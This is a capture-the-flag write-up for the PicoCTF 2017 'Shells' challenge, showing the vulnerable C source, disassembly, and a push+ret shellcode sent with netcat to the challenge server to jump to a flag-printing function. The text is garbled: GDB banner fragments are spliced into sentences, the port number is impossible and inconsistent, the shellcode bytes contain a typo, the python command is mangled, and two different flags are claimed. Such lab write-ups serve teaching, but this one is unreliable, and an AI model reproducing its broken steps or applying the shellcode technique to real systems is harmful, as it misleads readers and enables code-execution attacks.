# PicoCTF_2017: Shells

**Category:** Binary
**Points:** 70
**Description:**

>How much can a couple bytes do? Use [shells](shells) [Source](shells.c). Connect on shell2017.picoctf.com:6354540976.

**Hint:**

>Read about basic shellcode
You don't need a full shell (yet...), just enough to get the flag

## Write-up

1.  It's just little tricky one. But if you know basic of shellcode's then it might be easy for you. This time again we got two files
	```
	$ls
	shells shells.c
	```   
	So now lets try to HexDump the  `shells`  binary.
    
      ```
   Before we can craft a shellcode, we need to know the address of our `win()` function and loading up GDB is our best shot at it.

    $ gdb shells:
     file format elf32-i386
     Disassembly of section .init:
     08048378 <_init>:
      8048378:	53                   	push   %ebx
      8048379:	83 ec 08             	sub    $0x8,%esp
      804837c:	e8 ef 00 00 00       	call   8048470 <__x86.get_pc_thunk.bx>
      8048381:	81 c3 8b 16 00 00    	add    $0x168b,%ebx
      8048387:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
      804838d:	85 c0                	test   %eax,%eax
      804838f:	74 05                	je     8048396 <_init+0x1e>
      8048391:	e8 6a 00 00 00       	call   8048400 <__gmon_start__@plt>
      8048396:	83 c4 08             	add    $0x8,%esp
      8048399:	5b                   	pop    %ebx
      804839a:	c3                   	ret    
     
     Disassembly of section .plt:
     
     080483a0 <read@plt-0x10>:
      80483a0:	ff 35 10 9a 04 08    	pushl  0x8049a10
      80483a6:	ff 25 14 9a 04 08    	jmp    *0x8049a14
      80483ac:	00 00                	add    %al,(%eax)
     	...
     
     080483b0 <read@plt>:
      80483b0:	ff 25 18 9a 04 08    	jmp    *0x8049a18
      80483b6:	68 00 00 00 00       	push   $0x0
      80483bb:	e9 e0 ff ff ff       	jmp    80483a0 <_init+0x28>
     
     080483c0 <printf@plt>:
      80483c0:	ff 25 1c 9a 04 08    	jmp    *0x8049a1c
      80483c6:	68 08 00 00 00       	push   $0x8
      80483cb:	e9 d0 ff ff ff       	jmp    80483a0 <_init+0x28>
     --More--
    ```
    
So it'GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
    Copyright (C) 2014 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "x86 binary.

Now lets take a look on  `shells.c`  file.
    
	```
     #include <stdio.h>
     #include <stdlib.h>
     #include <unistd.h>
     #include <sys/mman.h>
     
     #define AMOUNT_OF_STUFF 10
     
     //TODO: Ask IT why this is here
     void win(){
         system("/bin/cat ./flag.txt");    
     }
     
     
     void vuln(){
         char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
         if(stuff == MAP_FAILED){
             printf("Failed to get space. Please talk to admin\n");
             exit(0);
         }
         printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
         fflush(stdout);
         int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
         if(len == 0){
             printf("You didn't give me anything :(");
             exit(0);
         }
         void (*func)() = (void (*)())stuff;
         func();      
     }
     
     int main(int argc, char*argv[]){
         printf("My mother told me to never accept things from strangers\n");
         printf("How bad could running a couple bytes be though?\n");
         fflush(stdout);
         vuln();
         return 0;
     }
	```
Just see their iss one  `win()`  function. Lets take a look on win() function in our HexDump. We can short out output us_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from shells...(no debugging symbols found)...done.
    (gdb) info address wing
  `grep`  command.
    
    objdump -d shells | grep win
     Symbol "win" is at 0x8048540 <win>:
    
We got the address in Hex we used to write it in this way in a file compiled without debugging.

Simple, now we know `win()` is at `0x08048540`.
    
Now we can use  [radare2](https://github.com/radare/radare2)  to generate our payload. Actually we need  `push+ret`  in order to make our payload.
    
    $rasm2 -C " Let's craft a really simple `push+ret` shellcode.

    0:  68 40 85 04 08          push   0x08048540"
    "\x68\x40\x85\x04\x08"
 5:  c3   
    $rasm2 -C "ret"
    "\xc3"
    

Here  `-C`  will give output in c format.Now combine the output of push+ret:               ret

Put together, this gives us `\x68\x40\x85\x04\x08\xcC3`

Now print this shellcode in one file name:  `spirit_shells`.

. Let's try it.

    $ python -c '"print "('\x68\x40\x85\x04\x08\xc3"' > spirit_shells

now just cat it out with the : shell2017.picoctf.com:63545

$cat spirit_shells - | nc shell2017.picoctf.com 63545
C3')" | nc shell2017.picoctf.com 40976
    My mother told me to never accept things from strangers
    How bad could running a couple bytes be though?
    Give me 10 bytes:
 529efbd9e2dec5400206bedaf6a10e21

So, i think we got the flag  `529efbd9e2dec5400206bedaf6a10e21`.

Hope you liked it

Thanks [Abhisek](https://github.com/vabhishek-me)   cd875b6ffb5cdd3319532d52ceca71aa

Therefore, the flag is `cd875b6ffb5cdd3319532d52ceca71aa`
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTQ5OTM4NjMyMSwxMjgwMDUzNTkzLC0xMj
M0NzA0Mjg4XX0=
-->